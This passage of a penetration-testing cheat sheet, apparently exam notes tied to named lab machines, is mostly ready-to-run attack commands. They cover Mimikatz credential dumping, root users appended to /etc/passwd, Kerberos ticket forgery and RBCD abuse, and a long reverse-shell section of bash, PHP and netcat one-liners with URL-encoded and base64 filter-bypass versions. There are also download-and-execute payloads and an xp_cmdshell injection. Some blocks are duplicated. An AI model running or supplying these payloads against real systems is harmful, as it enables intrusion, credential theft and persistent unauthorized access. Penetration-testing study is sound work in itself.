  - `Start-Service [SERVICE]`

- **DPAPI Masterkey & Credential Extraction:**
  - *Identify*: Look for files in `%AppData%\Local\Microsoft\Credentials\` or `%AppData%\Roaming\Microsoft\Protect\`.
  - *Extraction*:
    1. Base64 masterkey file: `powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\to\key'))"`
    2. Use Mimikatz: `mimikatz.exe "dpapi::cred /in:C:\path\to\creds_file /masterkey:[HEX_KEY]" "exit"`

- **Recursive Key/Credential Search (PowerShell):**
  - `Get-ChildItem -Path C:\ -Include *id_rsa*,*.pem,*.key,*.pub -File -Recurse -ErrorAction SilentlyContinue`

---

## 5. Utilities & Post-Exploitation

### Shell Stabilization (The Perfect Sequence)
1. **Spawn TTY**: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. **Background**: Hit `Ctrl + Z`
3. **Raw Mode**: `stty raw -echo; fg`
4. **Initialize**: Hit `Enter` once
5. **Reset**: Type `reset` and hit `Enter`
6. **Terminal Type**: If asked `Terminal type?`, type `xterm` and hit `Enter`

**Quick TTY Cheat Sheet:**
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `Ctrl+Z`, `stty raw -echo; fg`, `reset`

### 👤 Linux User & Auth Management (Persistence)
- **Add Sudo User**:
  ```bash
  useradd -m -s /bin/bash usta
  echo "usta:password" | chpasswd
  usermod -aG sudo usta
  ```
- **Fix SSH Config (Medtech Login Setup)**:
  ```bash
  # Ensure password auth is enabled if only keys worked
  grep "PasswordAuthentication" /etc/ssh/sshd_config
  sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
  systemctl restart ssh
  ```
  stty raw -echo; fg
  export TERM=xterm
  ```

### File Transfers
- **HTTP Server (Kali):**
  ```bash
  python3 -m http.server 80
  ```
- **Downloading (Linux):**
  ```bash
  wget http://172.10.10.10/file
  curl http://172.10.10.10/file -o file
  ```
- **Downloading (Windows):**
  ```powershell
  certutil -urlcache -f http://172.10.10.10/file file.exe
  iwr -uri http://172.10.10.10/file -outf file.exe
  ```

### Archiving & Compression
- **7-Zip (Linux/Windows)**:
  - *Create archive*: `7z a archive.zip folder/`
  - *Extract archive*: `7z x archive.zip`
- **Zip/Unzip**:
  - `zip -r archive.zip folder/`
  - `unzip archive.zip`

### Password Cracking
- **Hydra (Service Brute Force):**
  ```bash
  hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 4
  hydra -L users.txt -e nsr -t 16 ftp://10.10.10.10 # -e nsr: null, same, reverse
  ```
- **John the Ripper:**
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  john --format=nt hashes.txt --rules
  ```
- **SSH Key Cracking**: See detailed [SSH Key Passphrase Cracking (The "Evilbox-One" Flow)](#ssh-key-passphrase-cracking-the-evilbox-one-flow)
- **ZIP File Cracking:**
  ```bash
  zip2john backup.zip > zip.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
  ```
- **Hashcat:**
  ```bash
  hashcat -m 1000 ntlm_hash.txt rockyou.txt
  hashcat -m 5600 ntlm_v2_resp_hash.txt rockyou.txt
  ```

---

## 6. Advanced Active Directory & Kerberos

### Ticket Operations (Rubeus & Impacket)
- **TGT Delegation (Capture as current user):**
  ```powershell
  Rubeus.exe tgtdeleg /nowrap
  ```
- **Pass-the-Ticket (Linux):**
  ```bash
  export KRB5CCNAME=ticket.ccache
  impacket-psexec -k -no-pass [DOMAIN]/[USER]@[TARGET_NAME].[DOMAIN]
  ```
- **Converting Ticket Styles:**
  - **Kirbi to Ccache (Windows to Linux):**
    ```bash
    python3 kirbi2ccache.py ticket.kirbi ticket.ccache
    ```

### Silver Ticket Attack (Service Forgery)
- **Why**: Allows forging a ticket for a specific service (e.g., MSSQL, CIFS, HTTP) if you have the service account's NTHash.
- **Execution**:
  ```bash
  impacket-ticketer -nthash [SERVICE_NTHASH] -domain-sid [DOMAIN_SID] -domain [DOMAIN] -spn [SERVICE/HOST] [TARGET_USER]
  export KRB5CCNAME=[TARGET_USER].ccache
  ```

### Forest Trust Exploitation (Golden Ticket + Extra SIDs)
- **Why**: Escalate from a compromised Child Domain to the Forest Root Admin.
- **Requirement**: Child `krbtgt` hash and SID, Parent Forest SID (find via `lsadump::trust`, `Get-DomainSID`, or via LDAP as shown below).

- **Advanced SID Discovery (LDAP/ADSI)**:
  - *Scenario*: Use from a domain-joined machine to find trusted domain SIDs without RPC-reliant tools.
  ```powershell
  ([adsi]"LDAP://CN=System,$(([adsi]"LDAP://RootDSE").get('defaultNamingContext'))").Children | Where-Object {$_.SchemaClassName -eq 'trustedDomain'} | Select-Object @{n='RemoteDomain';e={$_.Name}}, @{n='SID';e={(New-Object System.Security.Principal.SecurityIdentifier($_.Get('securityIdentifier'), 0)).Value}}
  ```
- **Advanced SID Discovery (LDAP/ADSI)**:
  - *Scenario*: Use from a domain-joined machine to find trusted domain SIDs without RPC-reliant tools.
  ```powershell
  ([adsi]"LDAP://CN=System,$(([adsi]"LDAP://RootDSE").get('defaultNamingContext'))").Children | Where-Object {$_.SchemaClassName -eq 'trustedDomain'} | Select-Object @{n='RemoteDomain';e={$_.Name}}, @{n='SID';e={(New-Object System.Security.Principal.SecurityIdentifier($_.Get('securityIdentifier'), 0)).Value}}
  ```
- **Local `krb5.conf` Template (for Multi-Domain/Trusts)**:
  ```ini
  [libdefaults]
      default_realm = PARENT.LOCAL
      dns_lookup_realm = false
      dns_lookup_kdc = false
      rdns = false

  [realms]
      PARENT.LOCAL = { kdc = 192.168.1.10 }
      CHILD.PARENT.LOCAL = { kdc = 192.168.1.11 }

  [domain_realm]
      .parent.local = PARENT.LOCAL
      parent.local = PARENT.LOCAL
  ```
- **Execution**:
  ```bash
  mimikatz # kerberos::golden /user:Administrator /domain:[CHILD_DOMAIN] /sid:[CHILD_SID] /sids:[PARENT_SID]-519 /rc4:[CHILD_KRBTGT_HASH] /ptt
  ```

### Printer Bug (SpoolSample)
- **Why**: Force a remote machine (like a DC) to authenticate to your server.
- **Execution**: `.\SpoolSample.exe [TARGET_DC] [MY_LISTENER_SERVER]`
- **Capture**: Combine with `Rubeus monitor` to catch the TGT.

### RBCD Attack (Resource-Based Constrained Delegation)
- **Why**: Use if you have **GenericAll**, **GenericWrite**, or **WriteProperty (to msDS-AllowedToAct...)** on a Computer object.
- **1. Create Machine Account**:
  ```bash
  impacket-addcomputer 'sub.marine.com/Jackie:PwnedJackie123!' -computer-name 'ATTACKER_PC$' -computer-pass 'PwnedPC123!' -dc-ip 100.130.140.200
  ```
- **2. Add Delegation Right**:
  ```bash
  bloodyAD -u 'Jackie' -p 'PwnedJackie123!' -d 'sub.marine.com' --host 100.130.140.200 add rbcd 'DC02$' 'ATTACKER_PC$'
  ```
- **3. Get Service Ticket (S4U2Proxy)**:
  ```bash
  impacket-getST -dc-ip 100.130.140.200 -spn "cifs/DC02.sub.marine.com" -impersonate Administrator 'sub.marine.com/ATTACKER_PC$:PwnedPC123!'
  ```

### RBCD Attack (Resource-Based Constrained Delegation)
- **Why**: Use if you have **GenericAll**, **GenericWrite**, or **WriteProperty (to msDS-AllowedToAct...)** on a Computer object.
- **1. Create Machine Account**:
  ```bash
  impacket-addcomputer [DOMAIN]/[USER]:[PASS] -computer-name 'FOO$' -computer-pass 'Bar123!'
  ```
- **2. Configure Delegation**:
  ```bash
  impacket-rbcd -delegate-from 'FOO$' -delegate-to '[TARGET_COMPUTER]$'-action write '[DOMAIN]/[USER]:[PASS]'
  ```
- **3. Get ST (Impersonate Admin)**:
  ```bash
  impacket-getST -spn 'cifs/[TARGET_COMPUTER].[DOMAIN]' -impersonate Administrator '[DOMAIN]/FOO$':'Bar123!'
  ```
- **4. Access Target**:
  ```bash
  export KRB5CCNAME=Administrator.ccache
  impacket-psexec -k -no-pass [TARGET_COMPUTER].[DOMAIN]
  ```

### Privileged Rights Abuse
- **GenericAll / GenericWrite on User:**
  - *Action*: Change password or add SPN.
  ```bash
  rpcclient -U "DOMAIN/user%password" 10.10.10.10 -c "setuserinfo2 target_user 23 'NewPassword123!'"
  ```
- **GenericWrite (Add SPN for Kerberoasting):**
  ```powershell
  Set-ADUser target_user -ServicePrincipalNames @{Add='MSSQLSvc/fake.domain.local'}
  ```

---

## 7. Pivoting & Tunnels

### Chisel (Fast & Reliable)
- **Reverse Port Forward (Kali listens for connection):**
  ```bash
  # On Kali (Server)
  chisel server -p 8000 --reverse
  
  # On Victim (Client)
  chisel client 172.10.10.10:8000 R:8080:127.0.0.1:8080  # Forwards remote 8080 to local 8080
  ```

### SSH Key Passphrase Cracking (The "Evilbox-One" Flow)
- **Scenario**: Found an SSH private key (`id_rsa`) that starts with `Proc-Type: 4,ENCRYPTED`.
- **Step 1: Extract Hash**: 
  ```bash
  ssh2john id_rsa > id_rsa.hash
  ```
- **Step 2: Crack with Rockyou**: 
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  # Example: Found 'unicorn' for mowree (Evilbox-One)
  ```
- **Step 3: Decrypt Key (To avoid passphrase prompts)**: 
  ```bash
  openssl rsa -in id_rsa -out id_rsa.decrypted
  ```
- **Step 4: Use & Login**: 
  ```bash
  chmod 600 id_rsa.decrypted
  ssh -i id_rsa.decrypted user@10.10.10.10
  ```

### SSH Tunnelling
- **Local Port Forward:**
  ```bash
  ssh -L 8080:127.0.0.1:8080 user@10.10.10.10
  ```
- **Dynamic Port Forward (SOCKS Proxy):**
  ```bash
  ssh -D 1080 user@10.10.10.10
  # Then configure proxychains (/etc/proxychains4.conf)
  proxychains nmap -sT -Pn 10.10.10.11
  ```

---

## 8. Post-Exploitation Enumeration

### History Logs (Credential Leaks)
- **Linux Bash History:**
  ```bash
  cat /home/*/.bash_history
  cat /root/.bash_history
  ```
- **Vim History (Search & Command history):**
  ```bash
  cat ~/.viminfo
  # Check for:
  # 1. Search String History (?/...)
  # 2. Command Line History (:...)
  # 3. Input Line History
  ```
- **Windows PowerShell History:**
  ```powershell
  cat %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  ```
- **Git Repository Dumping / Credential Search:**
  ```bash
  git log
  git show [COMMIT_HASH]  # Look for cleartext creds in previous versions
  grep -rE "user|pass|secret" .
  ```

### Configuration & Secret Hunting
- **ConfigFile Search (Linux):**
  ```bash
  find / -name "*.php" -o -name "*.config" -o -name "*.cnf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
  ```
- **Memcached (Anonymous/SASL)**:
  - *Anonymous*: `telnet [IP] 11211` -> `stats items` -> `stats cachedump [ID] [LIMIT]`
  - *SASL Authenticated*:
    ```bash
    memcstat --servers=[IP] --username="[USER]" --password="[PASS]" --binary
    ```
- **Registry Query (Windows - Stored Creds):**
  ```powershell
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  ```
- **PuTTY Stored Session Credentials**:
  ```powershell
  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
  # Look for strings like: -pw 'password'
  ```

- **WiFi Mouse (Samuel/Machine 6) Stabilization**:
  - *Problem*: Characters merge, causing 404s (e.g., `rev.exeC:\Windows\Temp`).
  - *Fix*:
    1. Increase character delay to `0.1s` in `SendString`.
    2. Explicitly send space `SendString(" ")` with a longer `sleep(0.5)` afterward.
    3. Use `%TEMP%` instead of `C:\Windows\Temp`.
    4. Replace `sendto` with `send` if using a TCP socket.
  - *Targeted Payload*: `certutil.exe -urlcache -f http://[IP]/rev.exe %TEMP%\rev.exe`

## 9. Utilities & Shell Shortcuts

### Port Knocking (Open Filtered Ports)
- **Standard Sequence:**
  ```bash
  nmap -Pn -p [PORT1] 10.10.10.10
  nmap -Pn -p [PORT2] 10.10.10.10
  nmap -Pn -p [PORT3] 10.10.10.10
  ```

### Compilation (If GCC is available)
- **Static Compile (Avoid library issues):**
  ```bash
  gcc exploit.c -o exploit -static
  ```

### Cross-Compiling (Kali to Windows)
- **Target 64-bit EXE**: `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32`
- **Target DLL**: `x86_64-w64-mingw32-gcc -shared -o output.dll input.c`

### Steganography & Decoding
- **QR Code Decoding**:
  ```bash
  sudo apt install zbar-tools
  zbarimg secret.png
  ```
- **Morse Code Decoding (Audio)**:
  ```bash
  sudo apt install morse2ascii
  morse2ascii hahahaha.wav
  ```
- **Binary Code Decoding**:
  ```bash
  # Convert binary string (01101...) to ASCII
  echo "01101001 01100110..." | perl -lape '$_=pack"(B8)*",@F'
  ```
- **Password Hashing for /etc/passwd**:
  ```bash
  openssl passwd -1 password
  # Output: $1$MWFqbDKv$RwuPM3tCfwpD7Kckcl4Ea/
  
  # Inject Root User (Example Vegeta1):
  echo 'root2:$1$MWFqbDKv$RwuPM3tCfwpD7Kckcl4Ea/:0:0:root:/root:/bin/bash' >> /etc/passwd
  # Inject Tom (Example Vegeta1 Logs):
  echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
  ```

- **Hash Cracking (Unshadow):**
  - `unshadow passwd_file shadow_file > crackme.txt`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt`
  - *Example (Seppuku)*: `unshadow passwd.bak shadow.bak > crack_me.txt`
- **NT Hash Cracking (Windows Hashes):**
  - *Scenario*: You have an NTLM hash (e.g., from SAM/secretsdump).
  - *Command*: `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
  - *Example (Mary)*:
    `echo '9a3121977ee93af56ebd0ef4f527a35e' > Mary.hash`
    `john --format=NT Mary.hash`

### Operational Workarounds
- **Lowercase Wordlist (FFUF/Gobuster)**:
  - *Why*: Use if standard wordlists miss specific directories (e.g., `bulma`).
  - `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
- **Fix Kerberos Clock Skew (Faketime)**:
  - `faketime -f -5m impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`

- **Sudo gcore Memory Dumping (PrivEsc/Cred Harvest):**
  - *Context*: If `sudo -l` allows `/usr/bin/gcore`.
  - *Process*: `ps -u root` (Identify sensitive procs like `password-store` or `bash`).
  - *Dump*: `sudo gcore [PID]`
  - *Hunt*: `strings core.[PID] | grep -iE "pass|user|root|secret"`
  - *Note*: Use `grep -A 5 "Password:"` to find multi-line secrets.

- **SSH Legacy Algorithm Fixes:**
  - *Problem*: Modern SSH clients reject older servers (`kex error : no match for method mac algo`).
  - *Command*: `ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o MACs=hmac-sha1 -o HostKeyAlgorithms=+ssh-rsa [USER]@[IP]`
  - *Hydra Configuration*: Add `KexAlgorithms +diffie-hellman-group1-sha1`, etc., to `~/.ssh/config`.

---

## 10. Reverse Shells (The "Tak Tak Tak" Cheat Sheet)
Comprehensive list of one-liners with their URL-encoded versions for immediate use in LFI/RCE.

### 10.1. Bash Variations
**Standard Bash `-i`**
- **Command**: `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
- **URL Enc**: `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261`
- **Base64 Bypass (Most Reliable)**:
  - *Encode (Kali)*: `echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | base64`
  - *Payload (In URL)*: `...cmd=echo "[B64_DATA]" | base64 -d | bash`
  - *Why*: Bypasses filters blocking `&`, `>`, or complex URL characters.

**Bash 196 (The "Firewall Buster")**
- **Command**: `0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196`
- **URL Enc**: `0%3C%26196%3Bexec%20196%3C%3E%2Fdev%2Ftcp%2F10.10.10.10%2F4444%3B%20sh%20%3C%26196%20%3E%26196%202%3E%26196`

**Bash Readline (Advanced)**
- **Command**: `exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do $line 2>&5 >&5; done`
- **URL Enc**: `exec%205%3C%3E%2Fdev%2Ftcp%2F10.10.10.10%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done`

**Bash UDP (Special Access)**
- **Command**: `bash -i >& /dev/udp/10.10.10.10/4444 0>&1`

**Bash Hybrid (Most Reliable)**
- **Command**: `/bin/bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc [KALI_IP] [PORT] >/tmp/f`
- **Creation via Echo (Tactical)**:
  ```bash
  echo '#!/bin/bash' > shell.sh
  echo '/bin/bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [KALI_IP] [PORT] >/tmp/f' >> shell.sh
  ```
- **Why**: Handles both direct TCP and FIFO fallbacks for maximum stability.

---

### 10.2. PHP Variations
**PHP Shell Exec**
- **Command**: `php -r '$sock=fsockopen("10.10.10.10",4444);shell_exec("sh <&3 >&3 2>&3");'`
- **URL Enc**: `php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.10%22%2C4444%29%3Bshell_exec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

**PHP System**
- **Command**: `php -r '$sock=fsockopen("10.10.10.10",4444);system("sh <&3 >&3 2>&3");'`
- **URL Enc**: `php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.10%22%2C4444%29%3Bsystem%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

**PHP Proc_Open (High Reliability)**
- **Command**: `php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`
- **URL Enc**: `php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.10%22%2C4444%29%3B%24proc%3Dproc_open%28%22sh%22%2C%20array%280%3D%3E%24sock%2C%201%3D%3E%24sock%2C%202%3D%3E%24sock%29%2C%24pipes%29%3B%27`

**Ivan Sincek PHP RevShell (High Quality)**
- **Upload via LFI/Logs**: `wget http://[KALI_IP]/shell.php -O /var/www/html/rev.php`
- **Trigger**: `http://[IP]/rev.php`

**Generic RevShell One-liner (Trigger via shell.php?cmd=...)**
- **Command**: `bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'`
- **URL Encoded**: `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[KALI_IP]%2F4444%200%3E%261%27`

---

### 10.3. Netcat (NC) Variations
**NC with `-e` (Legacy)**
- **Command**: `nc 10.10.10.10 4444 -e /bin/bash`
- **URL Enc**: `nc%2010.10.10.10%204444%20-e%20%2Fbin%2Fbash`

**NC MKFIFO (Modern/Safe)**
- **Command**: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f`
- **URL Enc**: `rm%20%2Ftmp%2Ff%3Bmkfifo%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.10.10%204444%20%3E%2Ftmp%2Ff`

---
---

## 11. Git & Forensics
### 11.1. Git Analysis
- **Git Dumper**: `git-dumper http://[IP]/.git/ .git`
- **History Hunting**:
  - `git log -p --all`
  - `git show [HASH]`
- **Branch Size Triage (Spot the JUICY branch)**:
  - `cd .git/logs/refs/heads`
  - `ls -lna | sort -n -r`

### 11.2. MSSQL Enumeration & Escalation
- **MSSQL Global Data Dump (ForeachTable)**:
  - *Scenario*: Dump all data from all tables to a file.
  ```sql
  '; EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "EXEC sp_MSforeachtable ''SELECT ''''?'''' AS TableName, * FROM ?''" -o C:\tmp\dump.txt'; -- -
  ```

### 11.3. OS Forensics
- **Bash History**: `cat /home/*/.bash_history`
- **Vim Info**: `cat ~/.viminfo | grep -A 5 "Search String History"`

- **Network Traffic Analysis (Wireshark/PCAP)**:
  - *Filter HTTP POST Credentials*: `http.request.method == "POST"`
  - *Filter FTP Connections*: `tcp.port == 21`
  - *Follow Stream*: Right-click request -> Follow -> HTTP Stream (Check for plain-text `username=` and `password=`)

---

## 12. Miscellaneous Tactics & Tooling
- **WiFi Mouse FIX**:
  - *Note*: Use 0.1s delay between characters in `SendString`.
  - *Path*: Use `%TEMP%` instead of `C:\Windows\Temp`.
- **Port Knocking (Automatic Loop)**:
  - `for x in 7469 8475 9842; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x [IP]; done`
- **Memcached (Stats Dumping)**:
  - `telnet [IP] 11211`
  - `stats items`
  - `stats cachedump [ID] [LIMIT]`
- **FreeSWITCH RCE (Port 8021)**:
  - *Default Pass*: `ClueCon`
  - *Exploit*: `python3 freeexp.py [TARGET_IP] "[COMMAND]"`
- **Steganography / Decoding**:
  - **QR Code**: `zbarimg [file.png]`
  - **Morse in Audio**: `morse2ascii [file.wav]`
  - **Morse Visual**: Check Spectrogram for dots/dashes.
- **SSH Key Injection via File Upload**:
  - `curl -X POST http://[IP]/upload -F "file=@/path/id_rsa.pub" -F "filename=/home/[USER]/.ssh/authorized_keys"`

---

## 13. Exploit Development & Debugging (PY2 vs PY3)
Critical for fixing older exploits during the exam.

- **Variable Injection**:
  - *PY2*: `cmd = "curl http://%s/s.exe" % lhost`
  - *PY3*: `cmd = f"curl http://{lhost}/s.exe"`
- **Windows Paths**:
  - *Rule*: Always use `r"..."` (Raw String) for backslashes: `r"C:\Windows\Temp\shell.exe"`.
- **Hex Encoding**:
  - *PY2*: `hex_cmd = cmd.encode('hex')`
  - *PY3*: `hex_cmd = cmd.encode().hex()`
- **Socket Send**:
  - *Rule*: PY3 requires `bytes`: `s.send(cmd.encode())` or `s.send(b"A" * 100)`.
- **Long Commands**:
  - *Rule*: Use parentheses to wrap multi-line strings:
    ```python
    cmd = ("powershell -c \"IEX (New-Object Net.WebClient)."
           "DownloadString('http://%s/s.ps1')\"" % lhost)
    ```

**Debug Strategy**:
1. Check version: `python --version`.
2. If shell fails, check Python server logs (Look for 200 OK).
3. If 200 OK is present but no shell, it's likely AV/Defender. Try PowerShell or a different bypass.

---

**Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀

---

